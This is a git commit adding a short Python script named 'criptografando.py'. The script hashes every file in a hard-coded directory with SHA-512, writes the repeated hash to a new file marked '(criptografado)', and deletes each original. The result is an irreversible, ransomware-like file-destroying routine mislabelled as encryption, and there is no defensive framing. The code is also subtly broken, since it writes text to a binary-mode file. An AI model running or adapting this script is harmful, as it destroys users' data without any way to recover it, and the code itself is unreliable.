80b2d908cbdd63a97ee7926f9ccead36d09ec005
Ander ♾ <32654298+bitcoinander@users.noreply.github.com>
2021-09-18 10:29:02 -0300

    Add files via upload

---
+++ criptografando.py
@@ -0,0 +1,17 @@
+import hashlib
+import os
+
+dir = "/home/ander/Documentos/tools/"
+
+for files in os.listdir(dir):
+    os.chdir(dir)
+    with open(files, 'rb') as rb:
+        dados=rb.read()
+        cripto = hashlib.sha512(dados).hexdigest()
+        new= '(criptografado) ' + os.path.basename(files)
+        with open (new, 'wb') as novo:
+            novo.write(cripto*0xFF)
+            novo.close()
+            rb.close()
+
+            os.remove(files)
